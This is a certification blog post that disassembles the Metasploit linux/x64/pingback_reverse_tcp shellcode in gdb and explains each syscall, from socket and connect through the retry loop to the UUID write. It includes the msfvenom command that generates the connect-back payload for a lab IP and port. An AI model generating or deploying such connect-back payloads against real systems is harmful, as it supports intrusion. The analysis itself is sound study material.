Title: SLAE64 - Assignment 5.2
Date: 2022-06-25T09:03:11.000Z


## Disclaimer


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

[https://www.pentesteracademy.com/course?id=7](https://www.pentesteracademy.com/course?id=7)

Student ID: PA-30398

## Analysis

For the fifth assignment, I decided to analyze the following shellcode samples:

<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>linux/x64/meterpreter/reverse_tcp</td>
<td>Inject the mettle server payload (staged). Connect back to the attacker</td>
</tr>
<tr>
<td>linux/x64/pingback_reverse_tcp</td>
<td>Connect back to attacker and report UUID (Linux x64)</td>
</tr>
<tr>
<td>linux/x64/shell_bind_ipv6_tcp</td>
<td>Listen for an IPv6 connection and spawn a command shell</td>
</tr>
</tbody>
</table>

In this post, I'll document the logic of the second shellcode, `linux/x64/pingback_reverse_tcp`.

Let's start from the very beginning, i.e. generating the shellcode, which you can do by means of the `ruby` script `msfvenom` available by default on Kali Linux distributions.

Follows the command I used in order to generate the shellcode for this assignment:

```bash
msfvenom -p linux/x64/pingback_reverse_tcp LHOST=192.168.1.170 LPORT=443 -f elf -o shellcode        
# [-] WARNING: UUID cannot be saved because database is inactive.
# [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# No encoder specified, outputting raw payload
# Payload size: 125 bytes
# Final size of elf file: 245 bytes
# Saved as: shellcode
```

Next, we can start the analysis using `gdb`:

```bash
gdb -q ./shellcode
# Reading symbols from ./shellcode...
# (No debugging symbols found in ./shellcode)
(gdb) starti
# Starting program: /home/kali/slae64/exam/assignment/5/part/2/shellcode 

# Program stopped.
# 0x0000000000400078 in ?? ()
(gdb) x/12i $pc
# => 0x400078:    push   0xa
#    0x40007a:    pop    r9
#    0x40007c:    push   rsi
#    0x40007d:    push   rax
#    0x40007e:    push   0x29
#    0x400080:    pop    rax
#    0x400081:    cdq    
#    0x400082:    push   0x2
#    0x400084:    pop    rdi
#    0x400085:    push   0x1
#    0x400087:    pop    rsi
#    0x400088:    syscall
```

The last command I issued (`x/12i $pc`) prints 12 instructions from the current program counter.

Often times, you won't be able to use `disassemble` to show the next N assembly instructions, due to the fact there isn't a proper stack frame defined for the entry point.

As an example, when I ran the command `info registers`, I noticed the register `RBP` was set to 0.

An alternative to the command above is `x/12i $rip`, as they both to the same given that register `$rip` is the program counter in this case.

With this said, let's go back to analyzing the first block of instructions:

```nasm
; store the value 10 into the register R9
push   0xa
pop    r9

; push the values of RSI and RAX on the stack
push   rsi
push   rax

; syscall number 41: sys_socket
push   0x29
pop    rax

; sign-extend EAX in order to clear RDX
cdq    

; set RDI to 2
push   0x2
pop    rdi

; set RSI to 1
push   0x1
pop    rsi

; invoke sys_socket
syscall
```

They can be converted to the following C code:

```cpp
RAX = socket(
  2,            // AF_INET
  1,            // SOCK_STREAM
  0,            // IP protocol
);
```

It simply creates a new TCP socket. After that, we have the following instructions:

```bash
(gdb) x/11i $rip
# => 0x40008a:    test   rax,rax
#    0x40008d:    js     0x4000ca
#    0x40008f:    xchg   rdi,rax
#    0x400091:    movabs rcx,0xaa01a8c0bb010002
#    0x40009b:    push   rcx
#    0x40009c:    mov    rsi,rsp
#    0x40009f:    push   0x10
#    0x4000a1:    pop    rdx
#    0x4000a2:    push   0x2a
#    0x4000a4:    pop    rax
#    0x4000a5:    syscall
```

The first instruction `tests` the value stored inside the register `RAX`, setting the appropriate flags.

For example:

- if the value was 0, then the flag ZF (Zero Flag) would be set

- if the value was negative (signed), then the SF (Sign Flag) would be set.

In this case, if the value is signed, the instruction `js 0x4000ca` jumps to the address `0x4000ca`, which contains the following instructions:

```bash
(gdb) x/5i 0x4000ca
  #  0x4000ca:    push   0x3c
  #  0x4000cc:    pop    rax
  #  0x4000cd:    push   0x1
  #  0x4000cf:    pop    rdi
  #  0x4000d0:    syscall
```

It's simply a call to the syscall **0x3c **(`sys_exit`), which returns the exit code 1 (stored inside the register `RDI`).

Let's analyze the other instructions following the `test`:

```nasm
; save the file descriptor of the socket created previously into RDI
xchg   rdi,rax

; 0xaa -> 170
; 0x01 -> 1
; 0xa8 -> 168
; 0xc0 -> 192
; 0x01bb -> 443
; 0x0002 -> AF_INET
movabs rcx,0xaa01a8c0bb010002

; save the pointer to the previous data into RSI
push   rcx
mov    rsi,rsp

; set RDX to 16
push   0x10
pop    rdx

; set RAX to the calue 0x2a (syscall sys_connect)
push   0x2a
pop    rax

; invoke sys_connect
syscall
```

They can be converted to the following C code:

```cpp
struct sockaddr_in RSI;

myaddr.sin_family = AF_INET;
myaddr.sin_port = htons(443);
inet_aton("192.168.1.170", &amp;myaddr.sin_addr.s_addr);

connect(RDI, (struct sockaddr*)RSI, 16);
```

It simply creates a **sockaddr** structure that stores the IP address and the TCP port, along with address family (`AF_INET`, i.e. IPv4), and then it is passed to the function `connect`.

The latter connects the file descriptor obtained from the `socket` syscall to the remote socket `192.168.1.170:443`.

After the call to `sys_connect`, the following instructions are run:

```bash
(gdb) x/13i $rip
# => 0x4000a7:    pop    rcx
#    0x4000a8:    test   rax,rax
#    0x4000ab:    jns    0x4000d2
#    0x4000ad:    dec    r9
#    0x4000b0:    je     0x4000ca
#    0x4000b2:    push   rdi
#    0x4000b3:    push   0x23
#    0x4000b5:    pop    rax
#    0x4000b6:    push   0x0
#    0x4000b8:    push   0x5
#    0x4000ba:    mov    rdi,rsp
#    0x4000bd:    xor    rsi,rsi
#    0x4000c0:    syscall
```

Among the first instructions, there's a `pop rcx` that restores the old value of `RCX` (pushed by the instruction `0x40009b`).

After that, the instructions `test` and `jns` test whether the value returned by the syscall `connect` is signed or not. If the value is signed, hence negative, it means the function failed, and the socket client failed to connect to the socket server.

In that case, the shellcode doesn't perform any jumps, however it jumps to the address `0x4000ad`.

Let's analyze the instructions at that address:

```nasm
; decrease the value stored in R9 (see 2 instructions at 0x400078)
; the initial value is 0xa
; is the value after dec is 0, the shellcode jumps to 0x4000ca
dec    r9
je     0x4000ca

; save the file descriptor of the socket created previously on the stack
push   rdi

; set RAX to 35 -> sys_nanosleep
push   0x23
pop    rax

; create a timespec structure (5 seconds and 0 nanoseconds)
push   0x0
push   0x5

; get the address of the timespec structure and store it into RDI
mov    rdi,rsp

; clear RSI
xor    rsi,rsi

; invoke sys_nanosleep
syscall
```

These instructions can be converted to the following C code:

```cpp
if (RAX > 0)
{
  // 0x4000d2
}

if (R9 == 0)
{
  exit(1);
}

struct timespec t;
t.tv_sec = 5;
t.tv_nsec = 0;

nanosleep(&amp;t, NULL);
```

It seems the shellcode sleeps **5 seconds** if it can't connect the remote socket.

After the call to `sys_nanosleep` there this:

```bash
(gdb) x/10i $pc
# => 0x4000c2:    pop    rcx
#    0x4000c3:    pop    rcx
#    0x4000c4:    pop    rdi
#    0x4000c5:    test   rax,rax
#    0x4000c8:    jns    0x400091
#    0x4000ca:    push   0x3c
#    0x4000cc:    pop    rax
#    0x4000cd:    push   0x1
#    0x4000cf:    pop    rdi
#    0x4000d0:    syscall
```

As you may notice, the shellcode uses the `POP` instruction 3 times:

- 2 times in order to retrieve the value `0x0` and store it into `RCX`
- 1 time in order to retrieve the file descriptor of the socket, and store it into `RDI`

After that, it checks if the return value of `sys_nanosleep` is positive (non-signed), thus jumping back to `0x400091` in order to execute `sys_connect` once again.

If the syscall `sys_nanosleep` returns a signed value, then the shellcode goes to the address `0x4000ca` to invoke the syscall `sys_exit`.

These operations are performed 9 times, for a total of **45 seconds** in case it can't connect to the remote server.

You can test this by using the shell command `time`:

```bash
time ./shellcode

# real    45.01s
# user    0.00s
# sys     0.00s
# cpu     0%
```

Anyway, let's go back to the address `0x4000ab`. If the call to `connect` is successful, then the shellcode jumps to the address `0x4000d2`, which points to these instructions:

```bash
(gdb) x/3i $pc
# => 0x4000d2:    push   0x10
#    0x4000d4:    pop    rdx
#    0x4000d5:    call   0x4000ea

(gdb) x/5i 0x4000ea
  #  0x4000ea:    pop    rsi
  #  0x4000eb:    xor    rax,rax
  #  0x4000ee:    inc    rax
  #  0x4000f1:    syscall 
  #  0x4000f3:    jmp    0x4000ca
```

First, the register `RDX` is set to the value `0x10`, and after that the shellcode jumps straight to the address `0x4000ea`, which calls `sys_write`.

```nasm
; get the return address of the call, i.e. the address 0x4000da
pop rsi

; set RAX to 1 (sys_write)
xor rax,rax
inc rax

; invoke sys_write
syscalll

; jump to the address 0x4000ca
jmp 0x4000ca
```

The instructions above can be translated to the following code:

```cpp
write(
  RDI,    // file descriptor of the client socket
  RSI,    // pointer to the buffer to write (0x4000da)
  RDX     // value: 16; it will write 16 bytes
);

// jmp 0x4000ca
```

The buffer containing the bytes that the shellcode is going to send to the remote server is stored at the address `0x4000da`, which is the return address of the current `call`.

In particular, the bytes are the following:

```bash
(gdb) x/16xb 0x4000da
# 0x4000da:       0xe4    0x92    0xe3    0xc8    0xa4    0xbb    0x41    0x53
# 0x4000e2:       0xa8    0xfb    0x99    0x26    0xac    0x6c    0xd6    0x4c
```

Since it's 16 bytes, hence 32 hex digits, the resulting buffer can be represented by the following hex string:

```txt
e492e3c8a4bb4153a8fb9926ac6cd64c
```

This string represents the so-called `Pingback UUID` of the shellcode. The source code from metasploit contains a reference to this value:

```ruby
asm = %Q^
    ...
    send_pingback:
        push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
        pop rdx
        call get_uuid_address         ; put uuid buffer on the stack
        db #{uuid_as_db}  ; PINGBACK_UUID
    ...
    ^
```

Back to the instructions, right after the shellcode sends the Pingback UUID to the remote server, it jumps to the address `0x4000ca`, which, ad mentioned previously, leads to `sys_exit`, thus terminating the execution of the shellcode.

Overall, it seems that the only thing it does is connect to the socket server and send the UUID stored within itself.

